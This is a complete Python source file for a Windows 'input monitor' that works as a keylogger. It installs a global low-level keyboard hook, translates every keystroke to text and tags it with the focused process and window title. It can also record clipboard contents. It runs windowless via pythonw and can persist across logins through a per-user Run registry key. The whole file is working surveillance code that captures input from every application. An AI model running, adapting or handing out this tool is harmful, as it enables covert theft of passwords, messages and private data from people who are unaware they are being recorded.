#!/usr/bin/env python3
"""Windows input monitor built on a WH_KEYBOARD_LL hook.

Captures global keystrokes (independent of which process has focus), resolves
them to text through the active keyboard layout, and records each keystroke
under the foreground window/process that received it.

Two front ends share the same engine:

    pythonw input_monitor.py --log C:\\logs\\keys.txt      # headless
    pythonw input_monitor_ui.py                            # control panel

Options of interest:
    --clipboard          also record clipboard changes
    --no-window          flat log, no window/process headers
    --include-injected   log synthetic input (SendInput / keybd_event)
    --exclude-self       ignore keys typed into this process's windows
    --duration N         stop after N seconds (handy for testing)
    --install/--uninstall  register/remove a per-user Run key for autostart
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.wintypes as wt
import os
import sys
import threading
import time
import winreg
from datetime import datetime
from pathlib import Path

# ---------------------------------------------------------------------------
# Win32 bindings
# ---------------------------------------------------------------------------

user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
WM_SYSKEYDOWN = 0x0104
WM_SYSKEYUP = 0x0105
WM_QUIT = 0x0012

VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12
VK_CAPITAL = 0x14
VK_NUMLOCK = 0x90
VK_LSHIFT = 0xA0
VK_RSHIFT = 0xA1
VK_LCONTROL = 0xA2
VK_RCONTROL = 0xA3
VK_LMENU = 0xA4
VK_RMENU = 0xA5
VK_PACKET = 0xE7

LLKHF_INJECTED = 0x10

PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
ERROR_ALREADY_EXISTS = 183
CF_UNICODETEXT = 13

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, wt.WPARAM, wt.LPARAM)


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wt.DWORD),
        ("scanCode", wt.DWORD),
        ("flags", wt.DWORD),
        ("time", wt.DWORD),
        ("dwExtraInfo", ctypes.c_size_t),
    ]


user32.SetWindowsHookExW.argtypes = (ctypes.c_int, HOOKPROC, wt.HINSTANCE, wt.DWORD)
user32.SetWindowsHookExW.restype = wt.HHOOK
user32.CallNextHookEx.argtypes = (wt.HHOOK, ctypes.c_int, wt.WPARAM, wt.LPARAM)
user32.CallNextHookEx.restype = ctypes.c_ssize_t
user32.UnhookWindowsHookEx.argtypes = (wt.HHOOK,)
user32.UnhookWindowsHookEx.restype = wt.BOOL
user32.GetMessageW.argtypes = (ctypes.POINTER(wt.MSG), wt.HWND, wt.UINT, wt.UINT)
user32.GetMessageW.restype = ctypes.c_int
user32.PeekMessageW.argtypes = (ctypes.POINTER(wt.MSG), wt.HWND, wt.UINT, wt.UINT, wt.UINT)
user32.PeekMessageW.restype = wt.BOOL
user32.TranslateMessage.argtypes = (ctypes.POINTER(wt.MSG),)
user32.TranslateMessage.restype = wt.BOOL
user32.DispatchMessageW.argtypes = (ctypes.POINTER(wt.MSG),)
user32.DispatchMessageW.restype = ctypes.c_ssize_t
user32.PostThreadMessageW.argtypes = (wt.DWORD, wt.UINT, wt.WPARAM, wt.LPARAM)
user32.PostThreadMessageW.restype = wt.BOOL
user32.GetAsyncKeyState.argtypes = (ctypes.c_int,)
user32.GetAsyncKeyState.restype = ctypes.c_short
user32.GetKeyState.argtypes = (ctypes.c_int,)
user32.GetKeyState.restype = ctypes.c_short
user32.GetForegroundWindow.argtypes = ()
user32.GetForegroundWindow.restype = wt.HWND
user32.GetWindowTextLengthW.argtypes = (wt.HWND,)
user32.GetWindowTextLengthW.restype = ctypes.c_int
user32.GetWindowTextW.argtypes = (wt.HWND, wt.LPWSTR, ctypes.c_int)
user32.GetWindowTextW.restype = ctypes.c_int
user32.GetWindowThreadProcessId.argtypes = (wt.HWND, ctypes.POINTER(wt.DWORD))
user32.GetWindowThreadProcessId.restype = wt.DWORD
user32.GetKeyboardLayout.argtypes = (wt.DWORD,)
user32.GetKeyboardLayout.restype = wt.HKL
user32.ToUnicodeEx.argtypes = (
    wt.UINT, wt.UINT, ctypes.POINTER(ctypes.c_ubyte),
    wt.LPWSTR, ctypes.c_int, wt.UINT, wt.HKL,
)
user32.ToUnicodeEx.restype = ctypes.c_int
user32.OpenClipboard.argtypes = (wt.HWND,)
user32.OpenClipboard.restype = wt.BOOL
user32.GetClipboardData.argtypes = (wt.UINT,)
user32.GetClipboardData.restype = wt.HANDLE
user32.CloseClipboard.argtypes = ()
user32.CloseClipboard.restype = wt.BOOL
user32.GetClipboardSequenceNumber.argtypes = ()
user32.GetClipboardSequenceNumber.restype = wt.DWORD

kernel32.GetCurrentThreadId.argtypes = ()
kernel32.GetCurrentThreadId.restype = wt.DWORD
kernel32.CreateMutexW.argtypes = (ctypes.c_void_p, wt.BOOL, wt.LPCWSTR)
kernel32.CreateMutexW.restype = wt.HANDLE
kernel32.OpenProcess.argtypes = (wt.DWORD, wt.BOOL, wt.DWORD)
kernel32.OpenProcess.restype = wt.HANDLE
kernel32.QueryFullProcessImageNameW.argtypes = (
    wt.HANDLE, wt.DWORD, wt.LPWSTR, ctypes.POINTER(wt.DWORD),
)
kernel32.QueryFullProcessImageNameW.restype = wt.BOOL
kernel32.CloseHandle.argtypes = (wt.HANDLE,)
kernel32.CloseHandle.restype = wt.BOOL
kernel32.GlobalLock.argtypes = (wt.HANDLE,)
kernel32.GlobalLock.restype = ctypes.c_void_p
kernel32.GlobalUnlock.argtypes = (wt.HANDLE,)
kernel32.GlobalUnlock.restype = wt.BOOL

# ---------------------------------------------------------------------------
# Key tables
# ---------------------------------------------------------------------------

SPECIAL: dict[int, str] = {
    0x08: "<BACK>",
    0x09: "<TAB>",
    0x0D: "<ENTER>",
    0x1B: "<ESC>",
    0x21: "<PGUP>",
    0x22: "<PGDN>",
    0x23: "<END>",
    0x24: "<HOME>",
    0x25: "<LEFT>",
    0x26: "<UP>",
    0x27: "<RIGHT>",
    0x28: "<DOWN>",
    0x2C: "<PRTSC>",
    0x2D: "<INS>",
    0x2E: "<DEL>",
    0x5B: "<LWIN>",
    0x5C: "<RWIN>",
    0x5D: "<APPS>",
    0x6A: "<NUM*>",
    0x6B: "<NUM+>",
    0x6D: "<NUM->",
    0x6E: "<NUM.>",
    0x6F: "<NUM/>",
    0x90: "<NUMLOCK>",
    0x91: "<SCROLLLOCK>",
}
SPECIAL.update({0x70 + i: f"<F{i + 1}>" for i in range(24)})

CTRL_CHARS = {i: f"^{chr(i + 0x40)}" for i in range(1, 27)}  # ^A .. ^Z
CTRL_CHARS[0x1C] = "^\\"
CTRL_CHARS[0x1D] = "^]"
CTRL_CHARS[0x1E] = "^^"
CTRL_CHARS[0x1F] = "^_"

RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
DEFAULT_VALUE_NAME = "InputMonitor"

MUTEX_CLI = "Global\\im_{9f1c2f0e}"
MUTEX_UI = "Global\\imui_{9f1c2f0e}"


# ---------------------------------------------------------------------------
# Log writer
# ---------------------------------------------------------------------------

class Logger:
    """Append-only text log. One line per window section, keystrokes inline."""

    def __init__(self, path: Path, idle: float = 120.0, headers: bool = True):
        self.path = Path(path)
        self.idle = idle
        self.headers = headers
        self._lock = threading.RLock()
        self._fh = None
        self._line_open = False
        self._last_key = 0.0
        self._window: tuple[str, str] | None = None
        self.keys = 0          # keystrokes written in this session
        self.clipboard_items = 0

    # -- file handling -----------------------------------------------------
    def _open(self) -> None:
        if self._fh is None:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self._fh = self.path.open("a", encoding="utf-8", errors="replace", newline="")

    def _write(self, text: str) -> None:
        self._open()
        self._fh.write(text)
        self._fh.flush()

    def _section(self, text: str) -> None:
        with self._lock:
            if self._line_open:
                self._write("\n")
                self._line_open = False
            self._write(text + "\n")

    # -- public ------------------------------------------------------------
    def session_start(self, detail: str = "") -> None:
        self.keys = 0
        self.clipboard_items = 0
        self._line_open = False
        self._last_key = 0.0
        self._window = None
        host = os.environ.get("COMPUTERNAME", "?")
        self._section(
            f"===== session {datetime.now():%Y-%m-%d %H:%M:%S}  "
            f"{host}  pid={os.getpid()} {detail}".rstrip()
        )

    def session_end(self, reason: str = "") -> None:
        self._section(f"===== session end {datetime.now():%Y-%m-%d %H:%M:%S} {reason}".rstrip())

    def window(self, process: str, title: str) -> None:
        key = (process, title)
        if key == self._window:
            return
        self._window = key
        if not self.headers:
            return
        self._section(f"[{datetime.now():%H:%M:%S}] {process} :: {title or '(untitled)'}")

    def key(self, text: str) -> None:
        now = time.time()
        with self._lock:
            if self.headers and self._last_key and now - self._last_key > self.idle:
                proc, title = self._window or ("?", "")
                self._section(f"[{datetime.now():%H:%M:%S}] (idle) {proc} :: {title or '(untitled)'}")
            self._last_key = now
            if text == "<ENTER>":
                self._write("\n")
                self._line_open = False
            else:
                self._write(text)
                self._line_open = True
            self.keys += 1

    def clipboard(self, text: str) -> None:
        flat = " ".join(text.split())
        if len(flat) > 4000:
            flat = flat[:4000] + f" ...[{len(flat)} chars]"
        self._section(f"[{datetime.now():%H:%M:%S}] [CLIPBOARD] {flat}")
        self.clipboard_items += 1

    def close(self) -> None:
        with self._lock:
            if self._fh is None:
                return
            if self._line_open:
                self._write("\n")
                self._line_open = False
            self._fh.close()
            self._fh = None

    def truncate(self) -> None:
        """Empty the log file, keeping the writer usable."""
        with self._lock:
            self.close()
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self.path.write_text("", encoding="utf-8")
            self._line_open = False
            self._window = None

    def size(self) -> int:
        try:
            return self.path.stat().st_size
        except OSError:
            return 0


def truncate_file(path: Path) -> None:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("", encoding="utf-8")


# ---------------------------------------------------------------------------
# Windows helpers
# ---------------------------------------------------------------------------

def foreground_window() -> tuple[str, str, int]:
    """Return (process image name, window title, pid) for the focused window."""
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return "", "", 0
    title_len = user32.GetWindowTextLengthW(hwnd)
    buf = ctypes.create_unicode_buffer(title_len + 1)
    user32.GetWindowTextW(hwnd, buf, title_len + 1)

    pid = wt.DWORD(0)
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    process = ""
    if pid.value:
        handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid.value)
        if handle:
            try:
                path_buf = ctypes.create_unicode_buffer(1024)
                size = wt.DWORD(len(path_buf))
                if kernel32.QueryFullProcessImageNameW(handle, 0, path_buf, ctypes.byref(size)):
                    process = Path(path_buf.value).name
            finally:
                kernel32.CloseHandle(handle)
    return process, buf.value, pid.value


def _pressed(vk: int) -> bool:
    return bool(user32.GetAsyncKeyState(vk) & 0x8000)


def _toggled(vk: int) -> bool:
    return bool(user32.GetKeyState(vk) & 0x0001)


def keyboard_state() -> ctypes.Array:
    """Snapshot of the modifier state used for character translation."""
    state = (ctypes.c_ubyte * 256)()
    if _pressed(VK_SHIFT):
        state[VK_SHIFT] = state[VK_LSHIFT] = state[VK_RSHIFT] = 0x80
    if _pressed(VK_CONTROL):
        state[VK_CONTROL] = state[VK_LCONTROL] = state[VK_RCONTROL] = 0x80
    if _pressed(VK_MENU):
        state[VK_MENU] = state[VK_LMENU] = state[VK_RMENU] = 0x80
    if _toggled(VK_CAPITAL):
        state[VK_CAPITAL] = 0x01
    if _toggled(VK_NUMLOCK):
        state[VK_NUMLOCK] = 0x01
    return state


def active_layout() -> int:
    hwnd = user32.GetForegroundWindow()
    tid = user32.GetWindowThreadProcessId(hwnd, None) if hwnd else 0
    return user32.GetKeyboardLayout(tid) if tid else user32.GetKeyboardLayout(0)


# ---------------------------------------------------------------------------
# Keyboard hook
# ---------------------------------------------------------------------------

class KeyboardLogger:
    def __init__(self, logger: Logger, *, include_injected: bool = False,
                 window_titles: bool = True, debug: bool = False,
                 ignore_pid: int = 0):
        self.logger = logger
        self.include_injected = include_injected
        self.window_titles = window_titles
        self.debug = debug
        self.ignore_pid = ignore_pid
        self._proc = HOOKPROC(self._hook)  # keep alive for the hook's lifetime
        self._thread: threading.Thread | None = None
        self._ready = threading.Event()
        self._tid = 0
        self._hook: int | None = None
        self._dead: tuple[int, int] | None = None
        self._error: BaseException | None = None

    # -- lifecycle ---------------------------------------------------------
    def start(self) -> None:
        if self.is_alive():
            return
        self._ready.clear()
        self._hook = None
        self._dead = None
        self._error = None
        self._thread = threading.Thread(target=self._run, name="kbhook", daemon=True)
        self._thread.start()
        self._ready.wait(5.0)
        if self._error:
            raise self._error
        if not self._hook:
            raise ctypes.WinError(ctypes.get_last_error())

    def stop(self, timeout: float = 5.0) -> None:
        if self._thread is None or not self._thread.is_alive():
            return
        for _ in range(100):
            if user32.PostThreadMessageW(self._tid, WM_QUIT, 0, 0):
                break
            time.sleep(0.02)
        self._thread.join(timeout)

    def is_alive(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    # -- internals ---------------------------------------------------------
    def _run(self) -> None:
        try:
            self._tid = kernel32.GetCurrentThreadId()
            # Force creation of this thread's message queue before announcing readiness.
            msg = wt.MSG()
            user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 0)

            self._hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, self._proc, None, 0)
            if not self._hook:
                self._error = ctypes.WinError(ctypes.get_last_error())
                return
            self._ready.set()

            while True:
                ret = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                if ret in (0, -1):
                    break
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
        except BaseException as exc:  # surfaced through start()
            self._error = exc
            self._ready.set()
        finally:
            if self._hook:
                user32.UnhookWindowsHookEx(self._hook)
                self._hook = None

    def _hook(self, ncode, wparam, lparam):  # noqa: N802 (Win32 callback)
        if ncode == 0:  # HC_ACTION
            try:
                kb = ctypes.cast(lparam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                injected = bool(kb.flags & LLKHF_INJECTED)
                if not injected or self.include_injected:
                    self._on_key(kb, wparam)
            except Exception as exc:  # never let an exception cross into the hook
                if self.debug:
                    print(f"hook error: {exc!r}", file=sys.stderr)
        return user32.CallNextHookEx(None, ncode, wparam, lparam)

    def _on_key(self, kb: KBDLLHOOKSTRUCT, wparam: int) -> None:
        if wparam not in (WM_KEYDOWN, WM_SYSKEYDOWN):
            return
        if kb.vkCode == VK_PACKET:
            return
        if self.window_titles or self.ignore_pid:
            process, title, pid = foreground_window()
            if self.ignore_pid and pid == self.ignore_pid:
                return
            if self.window_titles:
                self.logger.window(process, title)
        text = translate(kb.vkCode, kb.scanCode, self)
        if text:
            self.logger.key(text)


def translate(vk: int, scan: int, owner: KeyboardLogger, state=None) -> str:
    """Resolve a virtual key + scan code to the text it produces."""
    special = SPECIAL.get(vk)
    if special:
        return special

    key_state = state if state is not None else keyboard_state()
    layout = active_layout()
    buf = ctypes.create_unicode_buffer(8)

    if owner._dead is not None:  # replay a pending dead key so the pair composes
        dead_vk, dead_scan = owner._dead
        owner._dead = None
        user32.ToUnicodeEx(dead_vk, dead_scan, key_state, buf, len(buf), 0, layout)

    count = user32.ToUnicodeEx(vk, scan, key_state, buf, len(buf), 0, layout)
    if count == -1:  # dead key: remembered for the next keystroke
        owner._dead = (vk, scan)
        return ""
    if count <= 0:
        return ""

    text = buf.value
    if len(text) == 1 and ord(text) < 0x20:
        return CTRL_CHARS.get(ord(text), "")
    return text


# ---------------------------------------------------------------------------
# Clipboard
# ---------------------------------------------------------------------------

class ClipboardWatcher(threading.Thread):
    def __init__(self, logger: Logger, interval: float = 0.5):
        super().__init__(name="clipboard", daemon=True)
        self.logger = logger
        self.interval = interval
        self._halt = threading.Event()

    def stop(self) -> None:
        self._halt.set()
        if self.is_alive():
            self.join(2.0)

    def run(self) -> None:
        last = user32.GetClipboardSequenceNumber()
        while not self._halt.wait(self.interval):
            seq = user32.GetClipboardSequenceNumber()
            if seq == last:
                continue
            last = seq
            text = self._read()
            if text:
                self.logger.clipboard(text)

    @staticmethod
    def _read() -> str:
        for _ in range(10):
            if user32.OpenClipboard(None):
                break
            time.sleep(0.03)
        else:
            return ""
        try:
            handle = user32.GetClipboardData(CF_UNICODETEXT)
            if not handle:
                return ""
            ptr = kernel32.GlobalLock(handle)
            if not ptr:
                return ""
            try:
                return ctypes.wstring_at(ptr)
            finally:
                kernel32.GlobalUnlock(handle)
        finally:
            user32.CloseClipboard()


# ---------------------------------------------------------------------------
# Engine: everything the front ends drive
# ---------------------------------------------------------------------------

class Engine:
    """Owns the logger, the keyboard hook and the clipboard watcher."""

    def __init__(self, log_path, *, clipboard: bool = False,
                 include_injected: bool = False, window_titles: bool = True,
                 idle: float = 120.0, exclude_self: bool = False,
                 debug: bool = False):
        self.log_path = Path(log_path)
        self.clipboard_enabled = clipboard
        self.logger = Logger(self.log_path, idle=idle, headers=window_titles)
        self.keyboard = KeyboardLogger(
            self.logger,
            include_injected=include_injected,
            window_titles=window_titles,
            debug=debug,
            ignore_pid=os.getpid() if exclude_self else 0,
        )
        self.clipboard = ClipboardWatcher(self.logger) if clipboard else None
        self.started_at: float | None = None
        self._running = False

    # -- state -------------------------------------------------------------
    @property
    def running(self) -> bool:
        return self._running

    @property
    def elapsed(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    @property
    def key_count(self) -> int:
        return self.logger.keys

    @property
    def size(self) -> int:
        return self.logger.size()

    # -- control -----------------------------------------------------------
    def start(self) -> None:
        if self._running:
            return
        detail = f"clipboard={self.clipboard_enabled}"
        self.logger.session_start(detail)
        try:
            self.keyboard.start()
        except Exception:
            self.logger.session_end("hook failed")
            raise
        if self.clipboard:
            self.clipboard = ClipboardWatcher(self.logger)
            self.clipboard.start()
        self.started_at = time.time()
        self._running = True

    def stop(self, reason: str = "stopped") -> None:
        if not self._running:
            return
        self.keyboard.stop()
        if self.clipboard:
            self.clipboard.stop()
            self.clipboard = None
        self.logger.session_end(reason)
        self.logger.close()
        self._running = False

    def clear(self) -> None:
        self.logger.truncate()


# ---------------------------------------------------------------------------
# Autostart
# ---------------------------------------------------------------------------

def autostart_command(log_path: Path) -> str:
    script = Path(__file__).resolve()
    if getattr(sys, "frozen", False):
        runner = Path(sys.executable)
        return f'"{runner}" --log "{log_path}"'
    pythonw = Path(sys.executable).with_name("pythonw.exe")
    runner = pythonw if pythonw.exists() else Path(sys.executable)
    return f'"{runner}" "{script}" --log "{log_path}"'


def autostart_get(name: str = DEFAULT_VALUE_NAME) -> str | None:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY) as key:
            value, _ = winreg.QueryValueEx(key, name)
            return value
    except OSError:
        return None


def install_autostart(name: str, log_path) -> str:
    log_path = Path(log_path).resolve()
    command = autostart_command(log_path)
    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
    return command


def uninstall_autostart(name: str) -> bool:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, name)
    except OSError:
        return False
    return True


# ---------------------------------------------------------------------------
# Entry point (headless)
# ---------------------------------------------------------------------------

def acquire_mutex(name: str):
    """Create a named mutex; returns the handle, or None when it is already held."""
    handle = kernel32.CreateMutexW(None, False, name)
    if not handle:
        return None
    if ctypes.get_last_error() == ERROR_ALREADY_EXISTS:
        kernel32.CloseHandle(handle)
        return None
    return handle


def release_mutex(handle) -> None:
    if handle:
        kernel32.CloseHandle(handle)


def single_instance(name: str) -> bool:
    handle = acquire_mutex(name)
    if handle is None:
        return False
    globals()["_MUTEX"] = handle  # keep the handle open for the process lifetime
    return True


def instance_running(name: str) -> bool:
    """True when another process already holds the named mutex."""
    handle = kernel32.CreateMutexW(None, False, name)
    if not handle:
        return False
    already = ctypes.get_last_error() == ERROR_ALREADY_EXISTS
    kernel32.CloseHandle(handle)
    return already


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Windows input monitor (low-level keyboard hook).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--log", default=str(Path(__file__).with_name("input-monitor.log")),
                   help="log file path")
    p.add_argument("--clipboard", action="store_true", help="record clipboard changes")
    p.add_argument("--no-window", action="store_true",
                   help="flat log without window/process headers")
    p.add_argument("--include-injected", action="store_true",
                   help="also log synthetic input (SendInput/keybd_event)")
    p.add_argument("--exclude-self", action="store_true",
                   help="ignore keys typed into this process's own windows")
    p.add_argument("--idle", type=float, default=120.0,
                   help="seconds of inactivity before a timestamped separator")
    p.add_argument("--duration", type=float, default=0.0,
                   help="stop after N seconds (0 = run until killed)")
    p.add_argument("--debug", action="store_true", help="print hook errors to stderr")
    p.add_argument("--install", action="store_true", help="register autostart Run key")
    p.add_argument("--uninstall", action="store_true", help="remove autostart Run key")
    p.add_argument("--name", default=DEFAULT_VALUE_NAME, help="autostart value name")
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    if args.install:
        command = install_autostart(args.name, args.log)
        print(f"registered HKCU\\{RUN_KEY}\\{args.name}")
        print(f"  -> {command}")
        return 0
    if args.uninstall:
        print(f"removed HKCU\\{RUN_KEY}\\{args.name}" if uninstall_autostart(args.name)
              else "no autostart entry present")
        return 0

    if not single_instance(MUTEX_CLI):
        return 0

    engine = Engine(
        args.log,
        clipboard=args.clipboard,
        include_injected=args.include_injected,
        window_titles=not args.no_window,
        idle=args.idle,
        exclude_self=args.exclude_self,
        debug=args.debug,
    )
    try:
        engine.start()
    except Exception as exc:
        print(f"failed to install keyboard hook: {exc}", file=sys.stderr)
        return 2

    deadline = time.time() + args.duration if args.duration > 0 else None
    reason = "terminated"
    try:
        while engine.keyboard.is_alive():
            if deadline and time.time() >= deadline:
                reason = "duration elapsed"
                break
            time.sleep(0.25)
    except KeyboardInterrupt:
        reason = "interrupted"
    finally:
        engine.stop(reason)
    return 0


if __name__ == "__main__":
    sys.exit(main())
